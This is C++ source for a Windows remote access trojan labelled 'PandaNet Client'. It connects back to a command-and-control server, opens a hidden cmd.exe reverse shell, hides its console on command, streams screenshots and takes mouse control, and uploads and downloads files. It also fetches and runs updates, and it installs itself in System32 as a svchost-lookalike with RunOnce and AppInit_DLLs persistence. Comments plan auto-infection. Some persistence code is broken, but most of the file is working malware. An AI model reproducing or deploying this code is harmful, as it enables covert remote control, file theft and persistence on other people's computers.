
#include <iostream>

#define WIN32_MEAN_AND_LEAN
#include <WinSock2.h>
#include <Psapi.h>
#include <windows.h>
int TestCompress( unsigned char* pDest, long* pnDestLen, const unsigned char* pSrc, long nSrcLen );
#include <string>
#include <sstream>
#include "Protection.h"
#include <string.h>
#include <math.h>
#include <conio.h>
//SecondServer.exe
#include <stdio.h>
#include <stdlib.h>
#include "Network.h"
using namespace std;
#define MAX_THREADS 10
#include "zlib.h"

#include "zconf.h"
#include "zlib.h"
//#include "easyzlib.h"
int ezcompress( unsigned char* pDest, long* pnDestLen,const unsigned char* pSrc, long nSrcLen );
int ezuncompress( unsigned char* pDest, long* pnDestLen, const unsigned char* pSrc, long nSrcLen );
#define PULSE_TIME 2000
#define RECONNECT_WAIT 3000
#define MAX_VNC_THREADS 11
int hostPort = 1526;
//char *hostIP = "69.250.69.182";
char *hostIP ="127.0.0.1";// "10.20.75.216";//"127.0.0.1";//"10.10.22.24";//"10.10.22.15";//"127.0.0.1";

void shellHandler(void *);
char *GetCompName(void);
void SendImage(SOCKET ThisVNC);
HANDLE shellInputW, shellOutputR;
PROCESS_INFORMATION shellPI;
SOCKET server;
int width=10;
int height=10;



     BITMAP bm;
    HDC dc;
    HDC Cdc;
    int cx;
    int cy;
struct VNCData{
	char *ID; // basicaly login info,
	int quality;
	int SockNum;




};
#include <windows.h>
#include <objidl.h>
#include <string>
#include <iostream>
#include <gdiplus.h>
#include <string.h>
using namespace Gdiplus;
#pragma comment (lib,"Gdiplus.lib")
INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
int shellHandlerActive = 0;
char versionNumber[] = "1330";
SOCKET VNCSOCKS[100];
char * VNCMasterThreadMessage;
int ImageQuality=10; //default ImageQuality
///ORDER OF OPERATIONS:
/*
1. Primary thread connects to server
2. Upon shell # connection, launches shell handler.
3. Shell handler spams output from shell to socket, while primary sends input as appropriate to the shell.
4. Shell handler is closed once shell # connection is terminated.

spawnl may be useful in running updates. Handy indeed.

*/

///Things are now looking good. Never forget Heap Corruption, though! That shit is dangerous! xD

///Update client using unique filename, to prevent failed saves. Overwrite old file? Or just use dynamic filenames?
///Integrate Protection.c
///Auto-infect
///Automatically find CnC server?
///Server-side shell? Directory is implemented. Yay.
///Copying files to/from server only uses original directory, not shell directory. This is also a concern with the update code, which relies on the original directory.
///Relaunch uses explicit path. It should not.
///Relaunch throws errors now and again: 22. Bad Command? WTF do you want from me!
RECT rect;
HWND                hWnd;
int VNCFLAG=0;
void stealth(int m){ShowWindow(GetConsoleWindow(),(m));}
void VNCSOCKET(int );

int proccessedFlag=0;





void MouseMove (int x, int y ){
  double fScreenWidth    = ::GetSystemMetrics( SM_CXSCREEN )-1;
  double fScreenHeight  = ::GetSystemMetrics( SM_CYSCREEN )-1;
  double fx = x*(65535.0f/fScreenWidth);
  double fy = y*(65535.0f/fScreenHeight);
  INPUT  Input={0};
  Input.type      = INPUT_MOUSE;
  Input.mi.dwFlags  = MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE;
  Input.mi.dx = fx;
  Input.mi.dy = fy;
  ::SendInput(1,&Input,sizeof(INPUT));

}



void LeftClick(){


  INPUT Input={0};
  // left down
  Input.type      = INPUT_MOUSE;
  Input.mi.dwFlags  = MOUSEEVENTF_LEFTDOWN;
  ::SendInput(1,&Input,sizeof(INPUT));
Sleep(100);
  // left up
  ::ZeroMemory(&Input,sizeof(INPUT));
  Input.type      = INPUT_MOUSE;
  Input.mi.dwFlags  = MOUSEEVENTF_LEFTUP;
  ::SendInput(1,&Input,sizeof(INPUT));






}
// use with move!!!!
void DragClick(int x, int y){

  INPUT Input={0};
  // left down
  Input.type      = INPUT_MOUSE;
  Input.mi.dwFlags  = MOUSEEVENTF_LEFTDOWN;
  ::SendInput(1,&Input,sizeof(INPUT));


MouseMove( x, y );
Sleep(500);
// left up
  ::ZeroMemory(&Input,sizeof(INPUT));
  Input.type      = INPUT_MOUSE;
  Input.mi.dwFlags  = MOUSEEVENTF_LEFTUP;
  ::SendInput(1,&Input,sizeof(INPUT));

}

void RightClick(){
INPUT    Input={0};
  // right down
  Input.type      = INPUT_MOUSE;
  Input.mi.dwFlags  = MOUSEEVENTF_RIGHTDOWN;
  ::SendInput(1,&Input,sizeof(INPUT));
Sleep(100);
  // right up
  ::ZeroMemory(&Input,sizeof(INPUT));
  Input.type      = INPUT_MOUSE;
  Input.mi.dwFlags  = MOUSEEVENTF_RIGHTUP;
  ::SendInput(1,&Input,sizeof(INPUT));
}

void VNCSOCKET(void* arg){
	// step one start socket
	char* ID=(char*)arg;
	WSADATA wsaData;
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0){
        printf("Network.c Error: WinSock failed to launch.\n");
       // return 0;
    }
	SOCKADDR_IN VNCaddr;
	 VNCaddr.sin_family = AF_INET;
    VNCaddr.sin_addr.s_addr = inet_addr(hostIP);
    VNCaddr.sin_port = htons(hostPort);
	SOCKET VNCcli;
	    dc=GetDC(NULL);
     Cdc=CreateCompatibleDC(dc);
     cx=GetSystemMetrics(SM_CXSCREEN);
     cy=GetSystemMetrics(SM_CYSCREEN);
	while(1){
        if((VNCcli = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){
             printf("Network.c Error: Socket is invalid.\n");
             //return 0;
        }
        printf("Network.c: VNC Connecting to Server %s:%d\n", inet_ntoa(VNCaddr.sin_addr), VNCaddr.sin_port);

        while(connect(VNCcli, (SOCKADDR *)&VNCaddr, sizeof(SOCKADDR_IN))){
            printf("VNC Network.c Error: Connection failed. Retrying in 3 seconds...\n");
            Sleep(RECONNECT_WAIT);

        }
		// SEND MY ID SEND IT NOW.
        printf("Network.c: VNC Connected to Server.\n");
		cout<<"ID here is...."<<ID<<endl;
		char * vncAuth=new char [100];
		
		strcpy(vncAuth,"VNCSOCKET");
		strcat(vncAuth,ID);
		cout << "What i tried to send was...:"<<vncAuth<<endl;
		sendData(VNCcli, vncAuth, strlen(vncAuth));
		int OffFlag=0;
		VNCFLAG=1;
		// NOW ITS REALLY SIMPLE 1 FLAG FOR ON IF OFF CLOSE THIS SOCKET ELSE IF REQUEST FOR IMAGE START POPPING THEM OUT
		while (!OffFlag){
		//cout<<"Yaya!"<<endl;
			
		//cout<<"In the loop";
		char * DataIn=new char[1000]; // NO DATA OVER 1000 CHAR
		DataIn=recvData(VNCcli);
		//cout<<"VNC SERVER Thread GOT:"<<DataIn<<endl;
		if (DataIn==NULL){
			//expetion! bad PTR
		}else{
		try{
		//cout<<"DataIn:"<<DataIn<<endl;
		if(!strcmp(DataIn,"GetImage")){
		sendData(VNCcli,"SendingData",strlen("SendingData"));
		SendImage(VNCcli);

		}else if(!strcmp(DataIn,"WM_MOVED")){
			int x=atoi(recvData(VNCcli)); 
			int y=atoi(recvData(VNCcli));
			MouseMove(x,y);

		}else if(!strcmp(DataIn,"WM_LDOWN")){
			  INPUT Input={0};
			 // left down
			 Input.type      = INPUT_MOUSE;
			 Input.mi.dwFlags  = MOUSEEVENTF_LEFTDOWN;
			::SendInput(1,&Input,sizeof(INPUT));
		}else if(!strcmp(DataIn,"WM_LUP")){
			INPUT Input={0};  
			::ZeroMemory(&Input,sizeof(INPUT));
			Input.type      = INPUT_MOUSE;
			Input.mi.dwFlags  = MOUSEEVENTF_LEFTUP;
			::SendInput(1,&Input,sizeof(INPUT));
		}else if(!strcmp(DataIn,"WM_RDOWN")){
			INPUT    Input={0};
			 // right down
			 Input.type      = INPUT_MOUSE;
			 Input.mi.dwFlags  = MOUSEEVENTF_RIGHTDOWN;
			::SendInput(1,&Input,sizeof(INPUT));
		}else if(!strcmp(DataIn,"WM_RUP")){
				INPUT    Input={0};
				::ZeroMemory(&Input,sizeof(INPUT));
				Input.type      = INPUT_MOUSE;
				Input.mi.dwFlags  = MOUSEEVENTF_RIGHTUP;
				::SendInput(1,&Input,sizeof(INPUT));

		}else if(!strcmp(DataIn,"CloseSocket")){
			// simple and short
			break;
		}
		
		}catch(...){

			printf("Throw some errors REAL time!\n");

			}
		}
		if (DataIn==NULL||DataIn==0||DataIn==""||strlen(DataIn)==0){
//		delete DataIn;
		
		}else{
		delete[] DataIn;

		}

			
		}


	}



}

void MASTERVNCSOCKET(void * arg){

	struct VNCData *ThisData=(VNCData*)arg;
	HANDLE VNCTHREADS[MAX_VNC_THREADS];
	ImageQuality=ThisData->quality;
	int SocketToCreate=ThisData->SockNum;
	int resetReady=0;
	while (1){
		if (!proccessedFlag){
			 resetReady=0;
			if(!strcmp("CreateVNC",VNCMasterThreadMessage)){
				 resetReady=0;
				while(SocketToCreate>0){
				_beginthread(VNCSOCKET,0,(void*)ThisData->ID);
				SocketToCreate--;

				}
			proccessedFlag=1;
			resetReady=1;
			}
			if(!strcmp("DestroyVNC",VNCMasterThreadMessage)){


			}
		}
	}




}

#include "C++NetworkLib.h";
int main(){
    //ConnectionManager ThisMgr;
	//Connection ImportantConnection=ThisMgr.CreateConnection();
	

    SetConsoleTitle(L"PandaNet Client");
    printf("Client version: %s\n", versionNumber);

    SOCKADDR_IN addr;
    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0){
        printf("Network.c Error: WinSock failed to launch.\n");
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(hostIP);
    addr.sin_port = htons(hostPort);

    while(1){
        if((server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){
             printf("Network.c Error: Socket is invalid.\n");
             return 0;
        }
        printf("Network.c: Connecting to Server %s:%d\n", inet_ntoa(addr.sin_addr), addr.sin_port);

        while(connect(server, (SOCKADDR *)&addr, sizeof(SOCKADDR_IN))){
            printf("Network.c Error: Connection failed. Retrying in 3 seconds...\n");
            Sleep(RECONNECT_WAIT);

        }

        printf("Network.c: Connected to Server.\n");

        //Send ye olde header!
        //1) version #
        //2) name
		sendData(server, "Regular", strlen("Regular"));
		char * ID=new char[100];
		ID=recvData(server);
		//int id=atoi(ID);
		cout<<"MY ID:"<<ID<<endl;
		//recv your ID-- Here is a good place to preset certain ID's so that they auto disconnect



        sendData(server, versionNumber, strlen(versionNumber));
        char * name = GetCompName();
        sendData(server, name, strlen(name));
        free(name); // neg


        DWORD read;

        while(1){
            char *in = recvData(server);
            if(in == NULL){
                printf("Warning: Server connection interrupted!\n");
                break;
            }

            printf("Got: %s\n", in);

			if(!strcmp(in, "VncStart")){
					// if some value like vnc not allowed then send no back
				if (!VNCFLAG){
					int SockNum=0;
					int QualityNum=0;
				sendData(server, "Attempting", strlen("Attempting"));
				SockNum=atoi(recvData(server));
				QualityNum=atoi(recvData(server));
				//send x and then y pixels
				int y;
				int x;
				char* Cx=new char[6];
				char* Cy=new char[6];
				x=GetSystemMetrics(SM_CXSCREEN);
				y=GetSystemMetrics(SM_CYSCREEN);
				itoa(x,Cx,10);
				itoa(y,Cy,10);
				sendData(server,Cx,strlen(Cx));
				sendData(server,Cy,strlen(Cy));
				



				struct VNCData PassData;
				PassData.ID=ID;
				PassData.SockNum=SockNum;
				PassData.quality=QualityNum;
				if (SockNum<0){

				}else{
				GdiplusStartupInput gdiplusStartupInput;
				ULONG_PTR gdiplusToken;
				GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);


				VNCMasterThreadMessage="CreateVNC";
				_beginthread(MASTERVNCSOCKET,0,(void*)&PassData);
				}

				}else{
				sendData(server, "VNCACTIVE", strlen("VNCACTIVE"));


				}
				
				
				
				// start VNC SOCKET HERE
				cout<<"HERE"<<endl;
				
			}


            if(!shellHandlerActive){
                if(!strncmp("makeshell", in, 9)){

                    _beginthread(shellHandler, 0, NULL);
                    printf("made shell!\n");

                }else if(!strncmp("updateclient", in, 12)){
                    printf("Update client! pl0x!\n");

                    FILE *f = fopen("update2.exe", "wb");
                    if(f != NULL){
                        sendData(server, "updateready", strlen("updateready"));
                        recvFile(server, f);
                        fclose(f);

                        int err = _spawnl(P_OVERLAY, "update2.exe", "", NULL);///no! NO! no, no No No NO! >:O
                        printf("shit: %d %d\n", err, errno);

                    }else{
                        sendData(server, "updatefailed", strlen("updatefailed"));
                    }

				}else if(!strncmp(in, "VNCSTOP", 7)){

                }else if(!strncmp(in, "ping", 4)){
                    printf("synch update\n");
                    //sendData(server, "pong", 4);
                }

            }else {
                if(!strncmp(in, "exit", 4)){
                    printf("Shell closure requested!");

                    shellHandlerActive = 0;
                }else if(!strncmp(in, "stealth", 7)){
                    if(!strncmp("1", &in[8], 1)){
                        printf("Stealthing!");
                        stealth(1);
                    }else{
                        printf("Unstealthing!");
                        stealth(0);
                    }
                }else if(!strncmp(in, "copyto", 6)){
					printf("File requested:%s\n", &in[7]);
                    FILE *localFile = fopen(&in[7], "wb");
                    if(localFile != NULL){
                        printf("Valid file requested.\n");
                        sendData(server, "VALID", strlen("VALID"));
                        recvFile(server, localFile);
                        fclose(localFile);
                        sendData(server, "File Recieved.\n", strlen("File Recieved.\n"));
                    }else{
                        printf("Invalid file requested!\n");
                        sendData(server, "INVALID", strlen("INVALID"));
                    }
                    WriteFile(shellInputW, "\n", strlen("\n"), &read, NULL);
			
                }else if(!strncmp(in, "copyfrom", 8)){
                    //copy file from client
                    ///1) tell server if requesteed file exists
                    ///2) if so, sendFile
                    printf("File requested:%s\n", &in[9]);
                    FILE *localFile = fopen(&in[9], "rb");
                    if(localFile != NULL){
                        printf("Valid file requested.\n");
                        sendData(server, "VALID", strlen("VALID"));
                        sendFile(server, localFile);
                        fclose(localFile);
                        sendData(server, "File Sent.\n", strlen("File Sent.\n"));
                    }else{
                        printf("Invalid file requested!\n");
                        sendData(server, "INVALID", strlen("INVALID"));
                    }
                    WriteFile(shellInputW, "\n", strlen("\n"), &read, NULL);

                }else{
                    printf("Write to shell: %s\n", in);
                    char *temp=new char[strlen(in) + 1];
                    strcpy(temp, in);
                    strcat(temp, "\n");
                    WriteFile(shellInputW, temp, strlen(temp), &read, NULL);
                }
            }
			if (in==NULL||in==0||in==""||strlen(in)==0){


			}else{
            delete[]in;
			}
        }
    }
    printf("Main loop exited...?\n");

    _getch();
    closesocket(server);
    WSACleanup();
    return 0;
}

void shellHandler(void *arg){
    shellHandlerActive = 1;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};

    HANDLE inputPipeR;
    HANDLE outputPipeW;

    if(!CreatePipe(&inputPipeR, &shellInputW, &sa, 0) || !CreatePipe(&shellOutputR, &outputPipeW, &sa, 0)){
        printf("SHANDLER: Pipe Creation Failed!\n");
    }

    STARTUPINFO si = {sizeof(si), NULL, 0, L"PYLONS!", 
    0, 0, 0, 0, 0, 0, 0, STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES,
    SW_HIDE, 0, NULL, inputPipeR, outputPipeW, outputPipeW};

    int success = CreateProcess(L"c:\\windows\\system32\\cmd.exe", NULL, NULL,
                                NULL, TRUE, 0, NULL, NULL, &si, &shellPI);
	if(!success){//Might be in D drive
		success = CreateProcess(L"d:\\windows\\system32\\cmd.exe", NULL, NULL,
                                NULL, TRUE, 0, NULL, NULL, &si, &shellPI);
	}
    CloseHandle(inputPipeR);
    CloseHandle(outputPipeW);

    if (success){
        DWORD read, avail;
        char *moo = new char[512];

        while (shellHandlerActive){
            PeekNamedPipe(shellOutputR, NULL, 0, NULL, &avail, NULL);
            if(avail > 0){
                ReadFile(shellOutputR, moo, 512, &read, NULL);
                moo[read] = '\0';

//                printf("%s", moo);
                sendData(server, moo, read);
            }
        }

    }else{
        printf("SHANDLER: Process Creation Fail! Error: %d\n", (int)GetLastError());
    }

    printf("SHANDLER: Awesomebagels.\n");

    DWORD exitCode;
    GetExitCodeProcess(shellPI.hProcess, &exitCode);
    TerminateProcess(shellPI.hProcess, exitCode);

    CloseHandle(shellPI.hProcess);
    CloseHandle(shellPI.hThread);

    CloseHandle(shellInputW);
    CloseHandle(shellOutputR);

}

char *GetCompName(){
    char *name = new char[MAX_COMPUTERNAME_LENGTH + 1];
    TCHAR compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD bufSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerName(compName, &bufSize);
    sprintf(name, "%s", compName);

    return name;
}




  // helper function
//Image* ImageCaptureAndCompress();
int totalsent=0;


CLSID             encoderClsid;
EncoderParameters encoderParameters;
ULONG             quality;
Gdiplus::Status            stat;
void SendImage(SOCKET ThisVNC){

	totalsent+=1;
     // Initialize GDI+.

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
   
  
  
    HBITMAP hMymap=CreateCompatibleBitmap(dc,cx,cy);
    SelectObject(Cdc,hMymap);
    BitBlt(Cdc, 0,0, cx, cy, dc,0,0,SRCCOPY); //slow
    GetObject(hMymap,sizeof(bm),&bm);
   // Graphics *mgraphics=new Graphics(dc);
    Image* image= new Bitmap(hMymap,NULL);
    GetEncoderClsid(L"image/jpeg", &encoderClsid);
	encoderParameters.Count = 1;
	encoderParameters.Parameter[0].Guid = EncoderQuality;
	encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
	encoderParameters.Parameter[0].NumberOfValues = 1;
	
   quality = ImageQuality;
   encoderParameters.Parameter[0].Value = &quality;
   


	IStream* MyPstream=NULL;

	HRESULT hr =CreateStreamOnHGlobal(NULL, TRUE, &MyPstream);

    
	stat = image->Save(MyPstream, &encoderClsid, &encoderParameters);
	//cout<<"Stat:"<<stat;
	ULARGE_INTEGER ulnSize;
	LARGE_INTEGER lnOffset;
	lnOffset.QuadPart = 0;
	if(MyPstream->Seek(lnOffset, STREAM_SEEK_END, &ulnSize) != S_OK)
{
    MyPstream->Release();
    
}

// now move the pointer to the beginning of the file

if(MyPstream->Seek(lnOffset, STREAM_SEEK_SET, NULL) != S_OK)
{
    MyPstream->Release();
 
}

 unsigned char *pBuff = new unsigned char[ulnSize.QuadPart];
  
char * OutBufNumber=new char[1000];
  itoa(ulnSize.QuadPart,OutBufNumber,10);
	
	sendData(ThisVNC,OutBufNumber,strlen(OutBufNumber));
        // Read the stream directly into the buffer
        ULONG ulBytesRead;
        if(MyPstream->Read((char *)pBuff, ulnSize.QuadPart, &ulBytesRead) != S_OK)
        {
            MyPstream->Release();
         
        }
		

	sendData(ThisVNC,(char *)pBuff,ulnSize.QuadPart);
	//DeleteObject(mgraphics);
	MyPstream->Release();
	DeleteObject(hMymap);
	//DeleteObject(Cdc);
	//delete MyPstream;
	delete image;
	delete [] pBuff;
	delete [] OutBufNumber;
	cout<<"sent:"<<totalsent<<endl;
	//  GdiplusShutdown(gdiplusToken);
	
}




/*
TO DO:
Change/Add NetworkCode and add in Ability to transfer images
*/

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0;          // number of image encoders
   UINT  size = 0;         // size of the image encoder array in bytes

   ImageCodecInfo* pImageCodecInfo = NULL;

   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
   if(pImageCodecInfo == NULL)
      return -1;  // Failure

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j)
   {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
         free(pImageCodecInfo);
         return j;  // Success
      }    
   }

   free(pImageCodecInfo);
   return -1;  // Failure






}
// use randomization table to create names/files/ect


void LocalInfection(){
	// move file to location x/y/z
	BOOL SCV;
	CopyFile(L"Client.exe",L"C:\\WINDOWS\SYSTEM32\\scvhostClient.exe",SCV);
	if (SCV==true){
		printf("Win Now make reg key!/n");


	}else{

		printf("Failed/n");

	}



}


void RegInstall(char FileLocation){
	//install DLL's / reg to start program
 HKEY   hkey;
 DWORD  dwDisposition;

 DWORD dwType, dwSize;

	 if(RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"), 0, NULL, 0, 0, NULL, &hkey, &dwDisposition)== 
        ERROR_SUCCESS)
	{
	 // write some information and close key.

	//HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
	char CurrentFileLocation;
	strcat(&CurrentFileLocation,"\"");	
	strcat(&CurrentFileLocation,&FileLocation);
	strcat(&CurrentFileLocation,"\\scvhostClient.exe\"");

	 RegSetValueEx(hkey, TEXT("ServicesToRun"), 0, dwType,(PBYTE)&CurrentFileLocation, dwSize);
	 RegCloseKey(hkey);
	 }
	


	  if( RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs"),0,0,&hkey)
		== ERROR_SUCCESS){
			cout<<"Sucess 2!"<<endl;
			char DllLocation;

			strcat(&DllLocation,"\"");	
			strcat(&DllLocation,&FileLocation);
			strcat(&DllLocation,"\\SVHost.dll\"");
			RegSetValueEx(hkey, TEXT("AppInit_DLLs"), 0, dwType,(PBYTE)&DllLocation, dwSize);
			RegCloseKey(hkey);




	  }




}


/*
BOOL LogonUser(
  __in      LPTSTR lpszUsername,
  __in_opt  LPTSTR lpszDomain,
  __in      LPTSTR lpszPassword,
  __in      DWORD dwLogonType,
  __in      DWORD dwLogonProvider,
  __out     PHANDLE phToken
);





DWORD WINAPI GetCurrentDirectory(
  __in   DWORD nBufferLength,
  __out  LPTSTR lpBuffer
);









*/